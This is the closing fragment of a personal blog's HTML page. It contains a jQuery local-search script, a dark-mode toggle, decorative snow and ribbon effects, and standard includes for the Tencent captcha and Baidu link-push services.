    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 白天和黑夜主题 -->
<div class="stars-con">
    <div id="stars"></div>
    <div id="stars2"></div>
    <div id="stars3"></div>  
</div>

<script>
    function switchNightMode() {
        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
        setTimeout(function () {
            $('body').hasClass('DarkMode') 
            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
            
            setTimeout(function () {
            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
                $(this).remove()
            })
            }, 2e3)
        })
    }
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    

    
    
    

    <!-- 雪花特效 -->
     
        <script type="text/javascript">
            // 只在桌面版网页启用特效
            var windowWidth = $(window).width();
            if (windowWidth > 768) {
                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
            }
        </script>
    

    <!-- 鼠标星星特效 -->
    

     
        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
        <script src="/libs/others/TencentCaptcha.js"></script>
        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
    

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    
    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
